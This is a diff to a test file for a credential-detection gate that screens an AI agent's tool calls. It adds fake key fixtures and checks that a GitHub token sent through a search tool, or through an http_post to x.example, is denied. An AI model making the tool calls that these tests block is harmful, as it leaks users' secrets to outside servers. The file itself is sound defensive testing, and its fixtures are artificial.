@@ -13,6 +13,8 @@ const ANTHROPIC = ['sk', 'ant', 'api03', 'Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Ji1Hg0FeDcBa']
 const AWS = ['AKIA', 'Q3ZT7XWP4LMN2RVB'].join('')
 const SLACK = ['xoxb', '123456789012', 'abcdefghijKLMNOP'].join('-')
 const PRIVATE = ['-----BEGIN', 'OPENSSH PRIVATE KEY-----'].join(' ')
+// The first body line of a key; the header alone is not a key.
+const PRIVATE_BODY = 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2g'
 
 describe('secret shapes', () => {
   it('finds a credential by its shape anywhere in the text', () => {
@@ -20,7 +22,7 @@ describe('secret shapes', () => {
     expect(secretKinds(`key=${ANTHROPIC}`)).toEqual(['Anthropic API key'])
     expect(secretKinds(`aws_access_key_id = ${AWS}`)).toEqual(['AWS access key'])
     expect(secretKinds(`slack ${SLACK}`)).toEqual(['Slack token'])
-    expect(secretKinds(`${PRIVATE}\nb3BlbnNzaC1rZXk=`)).toEqual(['private key'])
+    expect(secretKinds(`${PRIVATE}\n${PRIVATE_BODY}`)).toEqual(['private key'])
   })
 
   it('does not mistake ordinary text for a credential', () => {
@@ -28,6 +30,9 @@ describe('secret shapes', () => {
     // prose. The shapes demand the length a real credential has.
     expect(secretKinds('pip install scikit-learn; see sk-learn docs and the ghp_notes file')).toEqual([])
     expect(secretKinds('the AKIA prefix marks AWS keys; xoxb- marks Slack bots')).toEqual([])
+    // The header alone names a format: grep for it, docs about it. Found by an
+    // outside review: a search for key files was refused as a leaking key.
+    expect(secretKinds(`grep -l -- '${PRIVATE}' *.pem`)).toEqual([])
     // The key every AWS page prints as its example. Tutorials paste it into
     // the very commands this rule watches.
     expect(secretKinds(`aws configure set aws_access_key_id ${['AKIA', 'IOSFODNN7EXAMPLE'].join('')}`)).toEqual([])
@@ -38,7 +43,7 @@ function setup(overrides: Partial<Policy> = {}) {
   const base: Policy = structuredClone(DEFAULT_POLICY)
   base.mode = 'autonomous'
   base.profile = { effects: ['read', 'create', 'network-egress', 'export', 'exec'], resources: { paths: [], hosts: [] } }
-  base.tools = { http_post: ['network-egress'], save_note: ['create'] }
+  base.tools = { http_post: ['network-egress'], save_note: ['create'], search_docs: ['read'] }
   const policy: Policy = { ...base, ...overrides }
   return { policy, cert: issue(policy, 0), taint: new TaintStore(), cordonHome: '/home/u/.cordon', turn: 1 }
 }
@@ -65,6 +70,18 @@ describe('gate: a credential leaving the machine', () => {
     // Nothing leaves: .env files are where credentials belong.
     const decision = gate({ tool: 'save_note', args: { text: `GH_TOKEN=${GITHUB}` } }, setup())
     expect(decision.kind).toBe('allow')
+  })
+
+  it('a tool declared as a read still hands its arguments to someone', () => {
+    // An MCP search tool is a read, and the server behind it receives the
+    // query. Found by an outside review: the key went to it unchallenged.
+    const decision = gate({ tool: 'search_docs', args: { query: GITHUB } }, setup())
+    expect(decision.kind).toBe('deny')
+  })
+
+  it('a credential in a property name is found too', () => {
+    const decision = gate({ tool: 'http_post', args: { url: 'https://x.example', body: { [GITHUB]: 'ok' } } }, setup())
+    expect(decision.kind).toBe('deny')
   })
 
   it('a credential the user pasted into their own message passes', () => {
